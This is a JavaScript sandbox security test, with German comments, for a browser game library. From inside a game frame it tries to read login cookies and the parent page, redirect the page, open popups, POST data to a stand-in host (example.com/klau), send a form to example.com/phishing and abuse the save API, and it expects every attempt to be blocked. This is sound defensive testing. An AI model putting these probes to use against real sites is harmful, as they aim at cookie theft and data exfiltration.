// Sicherheitstest (Phase 7): Jeder Angriff muss scheitern (✓). „ℹ“ = bewusst akzeptiert, nur zur Info.
"use strict";
(async function () {
	const BIBLIOTHEK = "https://games.cuby0401.uk";
	const erg = [];
	const mit = (ok, name, detail) => erg.push({ ok, name, detail: String(detail ?? "") });
	const warte = (ms) => new Promise((r) => setTimeout(r, ms));
	const fehler = (e) => (e && e.name ? e.name + (e.message ? ": " + e.message : "") : String(e));
	const limit = (p, ms = 5000) => Promise.race([p, new Promise((_, n) => setTimeout(() => n(new Error("Zeitlimit")), ms))]);
	const verstoesse = [];
	document.addEventListener("securitypolicyviolation", (e) => verstoesse.push(e.violatedDirective + " " + e.blockedURI));

	// 1. Login-Cookie
	let keks = ""; try { keks = document.cookie; } catch (e) { keks = ""; }
	mit(!/CF_Authorization/.test(keks), "Login-Cookie nicht lesbar", keks ? keks.replace(/=[^;]*/g, "=…") : "keine Cookies sichtbar");

	// 2.–3. Bibliotheksseite
	try { void parent.document.title; mit(false, "Bibliotheksseite lesen", "parent.document lesbar!"); }
	catch (e) { mit(true, "Bibliotheksseite lesen", e.name); }
	try { void parent.localStorage.length; mit(false, "localStorage der Bibliothek", "lesbar!"); }
	catch (e) { mit(true, "localStorage der Bibliothek", e.name); }

	// 4.–5. Seite umleiten, Popup
	try { window.open("https://example.com/", "_top"); await warte(400); mit(true, "ganze Seite umleiten", "kein Wechsel"); }
	catch (e) { mit(true, "ganze Seite umleiten", fehler(e)); }
	let pop = null; try { pop = window.open("https://example.com/", "_blank"); } catch (e) { pop = null; }
	mit(!pop, "Popup öffnen", pop ? "Popup ging auf!" : "blockiert");

	// 6.–9. Netzwerk nach außen und zur Bibliothek
	async function abruf(name, url, opt) {
		try { const r = await limit(fetch(url, opt)); mit(false, name, "Antwort " + r.status + "!"); }
		catch (e) { mit(true, name, fehler(e)); }
	}
	await abruf("API der Bibliothek direkt aufrufen", BIBLIOTHEK + "/api/me", { credentials: "include" });
	await abruf("Daten an fremden Server senden", "https://example.com/klau?daten=x", { method: "POST", body: "x", mode: "no-cors" });
	const extern = await new Promise((r) => {
		const s = document.createElement("script");
		s.src = "https://cdn.jsdelivr.net/npm/three@0.160.0/build/three.min.js";
		s.onload = () => r([false, "geladen!"]); s.onerror = () => r([true, "blockiert"]);
		document.head.append(s); setTimeout(() => r([true, "nicht geladen"]), 5000);
	});
	mit(extern[0], "Script von CDN laden (E20)", extern[1]);
	const bild = await new Promise((r) => {
		const i = new Image(); i.onload = () => r([false, "geladen!"]); i.onerror = () => r([true, "blockiert"]);
		i.src = "https://example.com/tracking.png?wer=ich"; setTimeout(() => r([true, "nicht geladen"]), 5000);
	});
	mit(bild[0], "Tracking-Bild von fremdem Server", bild[1]);

	// 10. Formular nach außen
	const f = document.createElement("form");
	f.action = "https://example.com/phishing"; f.method = "post";
	document.body.append(f);
	try { f.submit(); } catch (e) { /* egal */ }
	await warte(800);
	mit(location.hostname !== "example.com", "Formular an fremden Server", "Seite blieb hier");

	// 11. Verbotene Dateien ausliefern
	for (const datei of ["./boese.exe", "./boese.sh", "./.geheim.txt"]) {
		try { const r = await limit(fetch(datei, { cache: "no-store" })); mit(r.status === 404, "Datei ausliefern: " + datei.slice(2), "Status " + r.status); }
		catch (e) { mit(true, "Datei ausliefern: " + datei.slice(2), fehler(e)); }
	}

	// 12. SVG mit Skript
	try {
		const r = await limit(fetch("./boese.svg", { cache: "no-store" }));
		const csp = r.headers.get("content-security-policy") || "";
		mit(/sandbox/.test(csp) && /default-src 'none'/.test(csp), "SVG-Skripte gesperrt (CSP)", csp.slice(0, 60));
	} catch (e) { mit(false, "SVG-Skripte gesperrt (CSP)", fehler(e)); }

	// 13.–16. Speichern über die Bibliothek missbrauchen
	if (!window.GameSave || !GameSave.available) {
		mit(null, "GameSave-Angriffe", "nur in der Bibliothek testbar");
	} else {
		const roh = (nachricht) => new Promise((r) => {
			const id = 900000 + Math.floor(Math.random() * 1000);
			const h = (e) => { if (e.data && e.data.id === id) { removeEventListener("message", h); r(e.data); } };
			addEventListener("message", h);
			parent.postMessage({ gs: 1, id, ...nachricht }, BIBLIOTHEK);
			setTimeout(() => r({ ok: false, error: "Zeitlimit" }), 5000);
		});
		const fremd = await roh({ op: "load", key: "spielstand", game: "seb/zaehler", spiel: "seb/zaehler", id_spiel: "seb/zaehler" });
		mit(fremd.ok && fremd.result && fremd.result.data === null, "Spielstand eines anderen Spiels lesen",
			fremd.ok ? "nur eigener (leerer) Stand: " + JSON.stringify(fremd.result) : fremd.error);
		const ls = await roh({ op: "save", key: "__ls", data: { gehackt: true } });
		mit(!ls.ok, "reservierten Key __ls überschreiben", ls.ok ? "gespeichert!" : ls.error);
		try { await GameSave.save("riesig", "x".repeat(300 * 1024)); mit(false, "300-KB-Spielstand (Grenze 256 KB)", "gespeichert!"); }
		catch (e) { mit(true, "300-KB-Spielstand (Grenze 256 KB)", e.message); }
		try { await GameSave.submitScore(999999999); mit(false, "Score ohne Bestenliste einreichen", "angenommen!"); }
		catch (e) { mit(true, "Score ohne Bestenliste einreichen", e.message); }
	}

	// Info: bewusst akzeptiert
	try { const r = await limit(fetch("/play/seb/zaehler/game.json")); mit(null, "Dateien anderer Spiele lesen (E14 akzeptiert)", "Status " + r.status); }
	catch (e) { mit(null, "Dateien anderer Spiele lesen (E14 akzeptiert)", fehler(e)); }
	mit(null, "CSP-Verstöße gemeldet", verstoesse.length + ": " + verstoesse.slice(0, 4).join(" | "));

	// Anzeige
	const tab = document.getElementById("tab");
	for (const e of erg) {
		const tr = tab.insertRow();
		tr.insertCell().textContent = e.ok === true ? "✓" : e.ok === false ? "✗" : "ℹ";
		tr.insertCell().textContent = e.name;
		const d = tr.insertCell(); d.className = "d"; d.textContent = e.detail;
	}
	const ok = erg.filter((e) => e.ok === true).length, nein = erg.filter((e) => e.ok === false).length;
	document.getElementById("summe").textContent = nein ? `✗ ${nein} Angriff(e) erfolgreich, ${ok} abgewehrt` : `✓ alle ${ok} Angriffe abgewehrt`;
	window.__boese = { ok, nein, erg };
})();
